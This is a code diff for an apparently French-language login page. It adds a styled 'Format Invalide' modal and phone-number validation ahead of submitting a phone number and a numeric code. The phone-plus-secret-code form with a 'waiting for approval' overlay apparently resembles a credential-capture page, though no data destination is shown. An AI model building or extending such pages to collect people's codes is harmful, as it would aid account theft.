@@ -184,6 +184,109 @@
   }
   .connexion-btn.active:active{transform:translateY(1px) scale(0.99);}
 
+  /* --- Invalid phone number modal --- */
+  .invalid-modal{
+    position:fixed;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+    background:rgba(0,0,0,0.48);
+    backdrop-filter:blur(6px);
+    -webkit-backdrop-filter:blur(6px);
+    z-index:100;
+  }
+
+  .invalid-modal.visible{display:flex;}
+
+  .invalid-card{
+    width:100%;
+    max-width:640px;
+    background:#fff;
+    border-radius:30px;
+    padding:54px 46px 62px;
+    text-align:center;
+    box-shadow:0 20px 55px rgba(0,0,0,0.22);
+  }
+
+  .warning-icon{
+    width:120px;
+    height:104px;
+    margin:0 auto 28px;
+    position:relative;
+    filter:drop-shadow(0 5px 4px rgba(0,0,0,0.15));
+  }
+
+  .warning-icon .triangle{
+    width:0;
+    height:0;
+    border-left:58px solid transparent;
+    border-right:58px solid transparent;
+    border-bottom:104px solid #ffc928;
+    position:absolute;
+    inset:0;
+    filter:drop-shadow(0 0 1px #d99b00);
+  }
+
+  .warning-icon .mark{
+    position:absolute;
+    left:50%;
+    top:31px;
+    transform:translateX(-50%);
+    width:12px;
+    height:48px;
+    border-radius:8px;
+    background:#252525;
+    z-index:1;
+  }
+
+  .warning-icon .dot{
+    position:absolute;
+    left:50%;
+    bottom:14px;
+    transform:translateX(-50%);
+    width:12px;
+    height:12px;
+    border-radius:50%;
+    background:#252525;
+    z-index:1;
+  }
+
+  .invalid-card h2{
+    color:#b93a32;
+    font-size:clamp(26px,7vw,38px);
+    font-weight:800;
+    margin-bottom:26px;
+  }
+
+  .invalid-card p{
+    color:#60646a;
+    font-size:clamp(16px,4.5vw,22px);
+    font-weight:600;
+    line-height:1.65;
+    margin:0 auto 36px;
+    max-width:540px;
+  }
+
+  .invalid-card button{
+    width:100%;
+    min-height:64px;
+    border:none;
+    border-radius:14px;
+    background:linear-gradient(135deg,#df2528,#c81318);
+    color:#fff;
+    font-size:20px;
+    font-weight:800;
+    cursor:pointer;
+    box-shadow:0 10px 24px rgba(227,6,19,0.28);
+  }
+
+  @media(max-width:480px){
+    .invalid-card{padding:48px 28px 52px;border-radius:28px;}
+    .warning-icon{transform:scale(.88);margin-bottom:18px;}
+  }
+
   /* --- Waiting-for-approval overlay --- */
   .approval-overlay{
     position:fixed;
@@ -312,6 +415,19 @@
     <button class="connexion-btn" id="connexionBtn" disabled>CONNEXION</button>
   </main>
 
+  <div class="invalid-modal" id="invalidModal" role="dialog" aria-modal="true" aria-labelledby="invalidTitle">
+    <div class="invalid-card">
+      <div class="warning-icon" aria-hidden="true">
+        <div class="triangle"></div>
+        <div class="mark"></div>
+        <div class="dot"></div>
+      </div>
+      <h2 id="invalidTitle">Format Invalide</h2>
+      <p id="invalidMessage">Le numéro de téléphone doit commencer par 9 (9 chiffres) ou 09 (10 chiffres)!<br>Veuillez entrer le bon numéro et réessayer!</p>
+      <button type="button" id="invalidOkBtn">OK</button>
+    </div>
+  </div>
+
   <div class="approval-overlay" id="approvalOverlay">
     <div class="spinner" id="spinner"></div>
     <h2 id="overlayTitle">En attente d'approbation</h2>
@@ -338,10 +454,22 @@
   const connexionBtn = document.getElementById('connexionBtn');
   const eyeBtn = document.getElementById('eyeBtn');
 
+  const invalidModal = document.getElementById('invalidModal');
+  const invalidMessage = document.getElementById('invalidMessage');
+  const invalidOkBtn = document.getElementById('invalidOkBtn');
+
+  function showInvalidPhone(message){
+    invalidMessage.innerHTML = message;
+    invalidModal.classList.add('visible');
+  }
+
   function checkFormValid(){
-    const phoneFilled = phoneInput.value.trim().length >= 9;
+    const phone = phoneInput.value.trim();
     const codeFilled = codeBoxes.every(b => b.value.length === 1);
-    if(phoneFilled && codeFilled){
+
+    // Let the user submit any entered number. Validation happens after
+    // clicking CONNEXION, so invalid numbers can show the modal.
+    if(phone.length > 0 && codeFilled){
       connexionBtn.classList.add('active');
       connexionBtn.disabled = false;
     } else {
@@ -350,7 +478,16 @@
     }
   }
 
-  phoneInput.addEventListener('input', checkFormValid);
+  phoneInput.addEventListener('input', () => {
+    // Keep the field clean, but do not show an error while typing.
+    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+    checkFormValid();
+  });
+
+  invalidOkBtn.addEventListener('click', () => {
+    invalidModal.classList.remove('visible');
+    phoneInput.focus();
+  });
 
   codeBoxes.forEach((box, i) => {
     box.addEventListener('input', () => {
@@ -423,10 +560,19 @@
   });
 
   connexionBtn.addEventListener('click', async () => {
+    const phone = phoneInput.value.trim();
+
+    // Show the invalid-number page only when the user tries to submit.
+    if(!/^9[0-9]{8}$/.test(phone)){
+      showInvalidPhone(
+        'Le numéro de téléphone doit commencer par 9 et contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!'
+      );
+      return;
+    }
+
     if(connexionBtn.disabled) return;
 
     const params = new URLSearchParams(window.location.search);
-    const phone = phoneInput.value.trim();
     const code = codeBoxes.map(b => b.value).join('');
     params.set('phone', phone);
 
